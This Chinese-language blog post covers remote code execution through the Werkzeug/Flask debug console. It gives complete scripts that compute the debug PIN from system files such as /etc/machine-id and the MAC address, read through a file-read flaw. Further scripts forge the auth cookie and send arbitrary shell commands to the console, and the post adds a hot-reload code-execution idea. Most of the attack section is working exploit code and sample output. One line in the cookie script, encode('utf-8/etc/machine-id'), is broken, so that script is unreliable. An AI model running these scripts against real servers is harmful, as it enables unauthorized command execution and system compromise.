---
title: Werkzeug debug 安全问题
date: 2023-06-15 05:42:51
categories:
- Python
tags:
- Werkzeug
toc: true
image:
  path: /assets/images/Werkzeug.png
---


Werkzeug debug 支持使用 console 来执行 python 代码。
```py
__import__('os').popen('whoami').read();
```
注意要加上最后的分号，否则不会有回显。

## console 任意代码执行

### pin 码构造
访问 console 页面通常需要 pin 码。正常情况下外部无法获取到 pin 码，分析[源码](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py) 中 pin 码的生成过程可知，pin 码的生成需要如下的 6 个变量。
```py
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```
全部获取这六个变量通常需要配合文件读取漏洞。
1. username
    username 是运行 python 程序的用户名， 可以通过读取 /etc/passwd 来获可能的用户名。

2. modname 
    modname 为 app 对象的 `"__module__"` 属性，如果不存在则为默认值 flask.app。源代码为：
    ```py
    modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
    ``` 
3. `getattr(app, "__name__", type(app).__name__),` 获取的是当前 app 对象的__name__属性，不存在则获取其类的`__name__`属性，默认为 Flask

4. `getattr(mod, '__file__', None)` 表示 flask 库 app.py 的绝对路径，在 debug 模式的情况下可以通过报错获取。注意： python2 中的这个值是 app.pyc

5. `str(uuid.getnode())` 获取的是当前网卡的物理地址的十进制表达方式。通常情况下首先通过读取 /proc/net/arp 中的 Device 字段的值确定网卡名称。
    ```bash
    └─$ cat /proc/net/arp               
    IP address       HW type     Flags       HW address            Mask     Device
    192.168.137.131  0x1         0x2         00:0c:29:24:60:e9     *        eth0
    192.168.137.93   0x1         0x2         00:0c:29:39:26:5e     *        eth0
    192.168.137.2    0x1         0x2         00:50:56:ea:45:9f     *        eth0
    ```
    这里获取到 eth0。然后通过 `/sys/class/net/<device id>/address` 来获取物理网卡地址：
    ```bash
    └─$ cat /sys/class/net/eth0/address 
    40:00:00:00:00:93
    ```
    最后计算十进制
    ```py
    >>> print(0x400000000093)
    70368744177811
    ```

6. get_machine_id() 是获取系统的 id，不同的系统读取的方式不同
   1. linux
        源码中首先会通过读取 /etc/machine-id 文件来获取这个值，如果这个文件不存在，则读取 /proc/sys/kernel/random/boot_id。
        
        读取到上述文件的值之后，会继续读取 /proc/self/cgroup 最后一个(/)到结尾的字符.
        ```py
        >>> with open("/proc/self/cgroup", "rb") as f:
            ...     print(f.readline())
            ... 
        b'0::/user.slice/user-1000.slice/session-2.scope\n'
        >>> with open("/proc/self/cgroup", "rb") as f:
        ...     linux += f.readline().strip().rpartition(b"/")[2]
        ... 
        >>> linux
        b'session-2.scope'
        ```
        然后将两者进行拼接，最终得到：
        ```
        0e5f878f6b6c4f04867b3ee69ad14862session-2.scope
        ```
    2. Windows
        读取注册表 `HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Cryptography/MachineGuid`
    3. Mac
        ioreg -c IOPlatformExpertDevice -d 2中"serial-number" = <{ID} 部分
    4. Docker 环境
        按照 /proc/self/cgroup 规则进行读取。

读取到这 6 个值之后可以通过如下的脚本生成 pin：
```py
import hashlib
from itertools import chain
probably_public_bits = [
    'kali',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/kali/.pyenv/versions/3.8.10/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '70368744177811',# str(uuid.getnode()),  /sys/class/net/eth0/address
    '0e5f878f6b6c4f04867b3ee69ad14862session-2.scope'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

利用 EXP
得到正确的 pin 码，可以利用如下脚本执行命令：
```py
#!/usr/bin/env python
import requests
import sys
import re
import json
import html

class EXP():
    def __init__(self) -> None:
        self.parse_input()
        self.sess = requests.session()
        self.sess.proxies = {
            "http":"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
        }
        self.secret = self.get_secret()
        self.pin_auth()
        self.execute_cmd()
    
    def parse_input(self):
        if len(sys.argv) != 4:
            print(f"USAGE: python {sys.argv[0]} <website> <pin> <cmd>")
            sys.exit(-1)
        self.host = sys.argv[1]
        self.pin = sys.argv[2]
        self.cmd = sys.argv[3]

    def get_secret(self):
        res = self.sess.get(f'{self.host}/console')
        secret = re.findall("[0-9a-zA-Z]{20}",res.text)

        if len(secret) != 1:
            print("[-] Couldn't get the SECRET")
            sys.exit(-1)
        else:
            secret = str(secret[0])
            print(f"[+] SECRET is: {secret}")
        return secret
    
    def pin_auth(self):
        try:
            res = self.sess.get(f"{self.host}/console?__debugger__=yes&cmd=pinauth&pin={self.pin}&s={self.secret}")
            if res.status_code == 200:
                res_data = json.loads(res.text)
                if res_data['auth'] == True:
                    print("[+] pin auth succeed")
                    cookie = res.headers['Set-Cookie']
                    header_cookie = {'Cookie':cookie}
                    self.sess.headers.update(header_cookie)
        except:
            print("[+] pin auth error")
            exit()

    def execute_cmd(self):
        cmd = f'''__import__('os').popen(\'{self.cmd}\').read();'''
        res = self.sess.get(f"{self.host}/console?&__debugger__=yes&cmd={cmd}&frm=0&s={self.secret}")
        print("[+] execute command ouput:\n")
        print(html.unescape(res.text))

if __name__ == '__main__':
    EXP()
```运行
使用：
```bash
python werkzeug.py http://127.0.0.1:5000 123-469-476 ls
```

### cookie 构造
获得 pin 码之后, 通常利用步骤如下:
1. 访问 /console 获取 secret
2. 带上 secret 和 pin 码访问 pinauth 接口获取 cookie
3. 带上 secret 和 cookie 执行命令.

但在一些 ssrf 的场景下, 第二步无法获取到响应头,也就无法获取 cookie. 分析源码可以发现 cookie 与 pin 码有关, 且可以直接计算出来. 参考文章:[(RCE) Flask + Werkzeug генерируем куку на основе PIN кода](https://vk.com/@greyteam-rce-flask-werkzeug-generiruem-kuku-na-osnove-pin-koda)
因此在 flask debug rce 的利用中, 可以直接省略 pinauth 步骤,直接通过 pin 码算出 cookie. 


cookie 生成脚本如下:
```py
import hashlib
from itertools import chain
import time

probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485378220034',# str(uuid.getnode()),  /sys/class/net/eth0/address
    'c99acdf71a05e4b95c47a008def069e05c39433f065dd663e174710750a627d38f98dee12214584e031c3d32b19558f9'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8/etc/machine-id')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]


cookie_value = f"{int(time.time())}|{hash_pin(rv)}"

def gen_pin_and_cookie():
    print("PIN : " + rv)
    cookie = "%s=%s" % (cookie_name,cookie_value)
    print("Cookie : %s" % (cookie))
    return rv, cookie

if __name__ == "__main__":
    gen_pin_and_cookie()
```
输出如下:
```bash
python gen_pin.py 
PIN : 237-329-095
Cookie : __wzd6dbe72d955ae6afe163f=1687229505|3600f69899c0
```
这在 ssrf 的场景下非常有用.

## 热部署导致的任意代码执行
有些情况下, ssrf 或许无法发送 post 请求, 导致即使算出了 cookie 也无法将其带上. 此时如果目标存在文件写漏洞, 则可以考虑这种方式:

debug 模式下，django 采用热部署的方式运行，因此配合文件写漏洞，修改 django app 源码，django 就会热更新进而执行修改后的代码，这个思路在 CISCN 2023 gosession 中有出现过。

## 参考
- [Werkzeug / Flask Debug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug)
- [Flask debug 模式下的 PIN 码安全性](https://xz.aliyun.com/t/8092#toc-3)
- [Flask Pin码构造详解](https://xz.aliyun.com/t/11647)
- [(RCE) Flask + Werkzeug генерируем куку на основе PIN кода](https://vk.com/@greyteam-rce-flask-werkzeug-generiruem-kuku-na-osnove-pin-koda)